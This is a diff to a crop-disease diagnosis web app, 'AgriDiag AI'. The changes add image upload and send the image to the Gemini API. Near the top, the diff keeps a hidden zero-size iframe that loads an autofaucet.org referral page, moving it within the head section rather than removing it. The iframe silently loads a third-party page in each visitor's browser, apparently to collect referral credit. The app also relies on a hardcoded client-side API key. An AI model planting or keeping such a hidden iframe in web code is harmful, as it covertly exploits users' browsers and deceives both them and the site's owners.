@@ -1,12 +1,12 @@
 ﻿<!DOCTYPE html>
 <html lang="en">
 <head>
-    <iframe src="https://autofaucet.org/wm/kenkor100/4" width="0" height="0" style="border:0"></iframe>
     <meta charset="UTF-8">
     <!-- IMPORTANT: When saving this file, ensure your text editor is set to save it with UTF-8 encoding.
          This is crucial for proper display of special characters (like those in French) when running the app offline directly from the file.
          Even with <meta charset="UTF-8">, some browsers might misinterpret the file if it's not actually saved as UTF-8. -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<iframe src="https://autofaucet.org/wm/kenkor100/4" width="0" height="0" style="border:0"></iframe>
     <title>AgriDiag AI</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -405,8 +405,14 @@
                             <i class="fas fa-upload mr-2"></i>Choose File
                         </button>
                         <span id="fileName" class="text-gray-600 text-sm italic" data-key="noFileChosen">No file chosen</span>
+                        <button id="clearImageButton" class="px-4 py-3 bg-red-500 text-white rounded-xl shadow-md hover:bg-red-600 transition duration-200 focus:outline-none focus:ring-2 focus:ring-red-400 focus:ring-opacity-75 hidden" data-key="clearImage">
+                            <i class="fas fa-times mr-1"></i>Clear Image
+                        </button>
                     </div>
-                    <p class="text-sm text-gray-500 mt-2" data-key="imageAnalysisDisclaimer">Currently, image analysis is a placeholder. Please describe symptoms for diagnosis.</p>
+                    <div id="imagePreviewContainer" class="mt-4 hidden">
+                        <img id="imagePreview" src="#" alt="Image Preview" class="max-w-full h-auto rounded-lg shadow-md border border-gray-300">
+                    </div>
+                    <p class="text-sm text-gray-500 mt-2" data-key="imageAnalysisDisclaimer">Upload an image to aid the AI in diagnosis. Image analysis is now active.</p>
                 </div>
 
                 <div class="flex justify-center items-center space-x-4">
@@ -801,7 +807,8 @@
                     </button>
             </div>
         </section>
-<!-- About Section (Placeholder) -->
+
+       <!-- About Section (Placeholder) -->
         <section id="about" class="bg-white p-8 rounded-2xl shadow-xl mb-12 border border-gray-200">
             <h2 class="text-3xl font-bold text-gray-800 mb-6 text-center" data-key="aboutAgriDiagAITitle">About AgriDiag AI</h2>
             <div class="text-lg text-gray-700 leading-relaxed max-w-3xl mx-auto space-y-4">
@@ -853,10 +860,10 @@
 
     <footer class="bg-gray-800 text-white py-6 mt-auto rounded-t-xl">
         <div class="container mx-auto text-center text-sm">
-             <p>&copy; 2025 AgriDiag AI. All rights reserved.</p>
-            <p class="mt-2" data-key="footerDisclaimer">Disclaimer: This tool is for informational purposes only. Consult with agricultural experts for precise advice.</p>
+            <p>&copy; 2024 AgriDiag AI. All rights reserved.</p>
+            <p class="mt-2">Disclaimer: This tool is for informational purposes only. Consult with agricultural experts for precise advice.</p>
             <p class="mt-2">
-                <a href="https://www.termsfeed.com/live/00cb7a0d-d1ea-4787-a7b8-fea62a4a339a" target="_blank" class="text-emerald-400 hover:underline" data-key="privacyNotice">Privacy Notice</a>
+                <a href="https://www.termsfeed.com/live/00cb7a0d-d1ea-4787-a7b8-fea62a4a339a" target="_blank" class="text-emerald-400 hover:underline">Privacy Notice</a>
             </p>
         </div>
     </footer>
@@ -878,6 +885,9 @@
         const symptomsInput = document.getElementById('symptomsInput');
         const imageUpload = document.getElementById('imageUpload');
         const fileNameSpan = document.getElementById('fileName');
+        const imagePreviewContainer = document.getElementById('imagePreviewContainer');
+        const imagePreview = document.getElementById('imagePreview');
+        const clearImageButton = document.getElementById('clearImageButton');
         const diagnoseButton = document.getElementById('diagnoseButton');
         const clearButton = document.getElementById('clearButton');
         const diagnosisResultDiv = document.getElementById('diagnosisResult');
@@ -957,7 +967,8 @@
                 uploadImageLabel: 'Upload Image (Optional):',
                 chooseFile: 'Choose File',
                 noFileChosen: 'No file chosen',
-                imageAnalysisDisclaimer: 'Currently, image analysis is a placeholder. Please describe symptoms for diagnosis.',
+                clearImage: 'Clear Image',
+                imageAnalysisDisclaimer: 'Upload an image to aid the AI in diagnosis. Image analysis is now active.',
                 getDiagnosis: 'Get Diagnosis',
                 clear: 'Clear',
                 diagnosisResultTitle: 'Diagnosis Result:',
@@ -1210,7 +1221,8 @@
                 uploadImageLabel: 'Télécharger une image (Optionnel) :',
                 chooseFile: 'Choisir un fichier',
                 noFileChosen: 'Aucun fichier choisi',
-                imageAnalysisDisclaimer: 'Actuellement, l\'analyse d\'images est un espace réservé. Veuillez décrire les symptômes pour le diagnostic.',
+                clearImage: 'Effacer l\'image',
+                imageAnalysisDisclaimer: 'Téléchargez une image pour aider l\'IA au diagnostic. L\'analyse d\'images est maintenant active.',
                 getDiagnosis: 'Obtenir le diagnostic',
                 clear: 'Effacer',
                 diagnosisResultTitle: 'Résultat du diagnostic :',
@@ -1616,16 +1628,40 @@
         }
 
         /**
-         * Displays the selected file name for image upload.
+         * Displays the selected file name for image upload and shows preview.
          * @param {HTMLInputElement} input - The file input element.
          */
         function displayFileName(input) {
             if (input.files.length > 0) {
-                fileNameSpan.textContent = input.files[0].name;
-                showToast(currentLanguage === 'fr' ? 'Image sélectionnée (à titre indicatif uniquement).' : 'Image selected (for display purposes only).');
+                const file = input.files[0];
+                fileNameSpan.textContent = file.name;
+                
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    imagePreview.src = e.target.result;
+                    imagePreviewContainer.classList.remove('hidden');
+                    clearImageButton.classList.remove('hidden');
+                };
+                reader.readAsDataURL(file);
+                showToast(currentLanguage === 'fr' ? 'Image sélectionnée.' : 'Image selected.');
             } else {
                 fileNameSpan.textContent = translations[currentLanguage]['noFileChosen'];
+                imagePreview.src = '#';
+                imagePreviewContainer.classList.add('hidden');
+                clearImageButton.classList.add('hidden');
             }
+        }
+
+        /**
+         * Clears the selected image and its preview.
+         */
+        function clearImageSelection() {
+            imageUpload.value = ''; // Clear file input
+            fileNameSpan.textContent = translations[currentLanguage]['noFileChosen'];
+            imagePreview.src = '#';
+            imagePreviewContainer.classList.add('hidden');
+            clearImageButton.classList.add('hidden');
+            showToast(currentLanguage === 'fr' ? 'Image effacée.' : 'Image cleared.');
         }
 
         /**
@@ -2159,6 +2195,7 @@
             const cropType = cropTypeSelect.value;
             const severity = severitySelect.value;
             const symptoms = symptomsInput.value.trim();
+            const imageFile = imageUpload.files[0];
 
             if (!cropType) {
                 showToast(currentLanguage === 'fr' ? 'Veuillez sélectionner un type de culture.' : 'Please select a crop type.');
@@ -2168,8 +2205,8 @@
                 showToast(currentLanguage === 'fr' ? 'Veuillez sélectionner la gravité des symptômes.' : 'Please select the symptom severity.');
                 return;
             }
-            if (!symptoms) {
-                showToast(currentLanguage === 'fr' ? 'Veuillez décrire les symptômes avant d\'obtenir un diagnostic.' : 'Please describe the symptoms before getting a diagnosis.');
+            if (!symptoms && !imageFile) {
+                showToast(currentLanguage === 'fr' ? 'Veuillez décrire les symptômes ou télécharger une image avant d\'obtenir un diagnostic.' : 'Please describe the symptoms or upload an image before getting a diagnosis.');
                 return;
             }
 
@@ -2187,12 +2224,29 @@
             diagnosisResultDiv.classList.add('hidden'); // Hide previous result
 
             try {
+                let base64ImageData = null;
+                if (imageFile) {
+                    buttonText.textContent = currentLanguage === 'fr' ? 'Traitement de l\'image...' : 'Processing Image...';
+                    base64ImageData = await new Promise((resolve, reject) => {
+                        const reader = new FileReader();
+                        reader.onload = () => resolve(reader.result);
+                        reader.onerror = error => reject(error);
+                        reader.readAsDataURL(imageFile);
+                    });
+                }
+
                 // Construct the prompt for the Gemini API, including crop type and severity
-                const prompt = `Act as an expert agricultural diagnostician. Respond in ${currentLanguage === 'fr' ? 'French' : 'English'}.
+                let prompt = `Act as an expert agricultural diagnostician. Respond in ${currentLanguage === 'fr' ? 'French' : 'English'}.
                 Crop Type: ${cropType}
                 Symptom Severity: ${severity}
                 Symptoms: ${symptoms}
+                `;
 
+                if (imageFile) {
+                    prompt += `\n\nAnalyze the provided image along with the symptoms.`;
+                }
+
+                prompt += `
                 Based on the above, provide a concise diagnosis of the most probable plant disease or issue for a ${cropType} plant, considering the ${severity} symptom severity, and suggest immediate, practical recommendations for treatment or management.
 
                 Structure your response with:
@@ -2203,13 +2257,25 @@
                 * [etc.]
                 `;
 
-                let chatHistory = [];
-                chatHistory.push({ role: "user", parts: [{ text: prompt }] });
-                const payload = { contents: chatHistory };
+                const parts = [{ text: prompt }];
+                if (base64ImageData) {
+                    parts.push({
+                        inlineData: {
+                            mimeType: imageFile.type,
+                            data: base64ImageData.split(',')[1] // Remove "data:image/png;base64," prefix
+                        }
+                    });
+                }
+                
+                // Corrected payload structure
+                const payload = { 
+                    contents: [{ role: "user", parts: parts }] 
+                };
 
                 // Use the hardcoded API key
                 const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${geminiApiKey}`;
 
+                buttonText.textContent = currentLanguage === 'fr' ? 'Envoi à l\'IA...' : 'Sending to AI...';
                 const response = await fetch(apiUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -2260,13 +2326,15 @@
                 let userMessage = currentLanguage === 'fr' ? 'Une erreur est survenue. Veuillez réessayer.' : 'An error occurred. Please try again.';
                 let technicalDetails = error.message || 'Unknown error';
 
-                if (error instanceof TypeError && error.message === 'Failed to fetch') {
+                if (error instanceof TypeError && error.message.includes('Failed to fetch')) {
                     userMessage = currentLanguage === 'fr' ? 'Impossible de se connecter au service de diagnostic AI. Veuillez vérifier votre connexion Internet.' : 'Failed to connect to AI diagnosis service. Please check your internet connection.';
                     technicalDetails = 'Network error: Failed to fetch';
                 } else if (error.message.includes("API key not valid")) {
                     userMessage = currentLanguage === 'fr' ? 'Clé API invalide. Veuillez vérifier votre clé API Gemini.' : 'Invalid API key. Please check your Gemini API key.';
                 } else if (error.message.includes("Access denied")) {
                     userMessage = currentLanguage === 'fr' ? 'Accès refusé. Vérifiez les autorisations de votre clé API.' : 'Access denied. Check your API key permissions.';
+                } else if (error.message.includes("File reading error")) {
+                     userMessage = currentLanguage === 'fr' ? 'Erreur de lecture du fichier image. Veuillez réessayer.' : 'Image file reading error. Please try again.';
                 }
 
                 showToast(userMessage);
@@ -2308,8 +2376,7 @@
             cropTypeSelect.value = '';
             severitySelect.value = '';
             symptomsInput.value = '';
-            imageUpload.value = ''; // Clear file input
-            fileNameSpan.textContent = translations[currentLanguage]['noFileChosen'];
+            clearImageSelection(); // Clear image as well
             diagnosisResultDiv.classList.add('hidden');
             showToast(currentLanguage === 'fr' ? 'Saisie du diagnostic effacée.' : 'Diagnosis input cleared.');
         }
@@ -2726,7 +2793,7 @@
                 let userMessage = currentLanguage === 'fr' ? 'Une erreur est survenue. Veuillez réessayer.' : 'An error occurred. Please try again.';
                 let technicalDetails = error.message || 'Unknown error';
 
-                if (error instanceof TypeError && error.message === 'Failed to fetch') {
+                if (error instanceof TypeError && error.message.includes('Failed to fetch')) {
                     userMessage = currentLanguage === 'fr' ? 'Impossible de se connecter au service de recommandations AI. Veuillez vérifier votre connexion Internet.' : 'Failed to connect to AI recommendation service. Please check your internet connection.';
                     technicalDetails = 'Network error: Failed to fetch';
                 } else if (error.message.includes("API key not valid")) {
@@ -2747,7 +2814,7 @@
         }
 
         /**
-         * Clears the input fields for planting recommendations.
+         * Clears the input fields for the planting recommendations section.
          */
         function handleClearPlantingInputs() {
             soilNitrogen.value = '';
@@ -2758,7 +2825,7 @@
             pestIssuesNotes.value = '';
             lastSeasonWeatherNotes.value = '';
             plantingRecommendationResult.classList.add('hidden');
-            showToast(currentLanguage === 'fr' ? 'Saisies des recommandations de plantation effacées.' : 'Planting recommendation inputs cleared.');
+            showToast(currentLanguage === 'fr' ? 'Entrées de recommandation de plantation effacées.' : 'Planting recommendation inputs cleared.');
         }
 
 
@@ -2769,6 +2836,7 @@
         clearButton.addEventListener('click', handleClearDiagnosisInputs);
         clearHistoryButton.addEventListener('click', handleClearDiagnosisHistory);
         copyDiagnosisButton.addEventListener('click', copyDiagnosisToClipboard);
+        clearImageButton.addEventListener('click', clearImageSelection);
 
         // Language switcher event listeners
         languageSwitcherDesktop.addEventListener('change', (event) => {
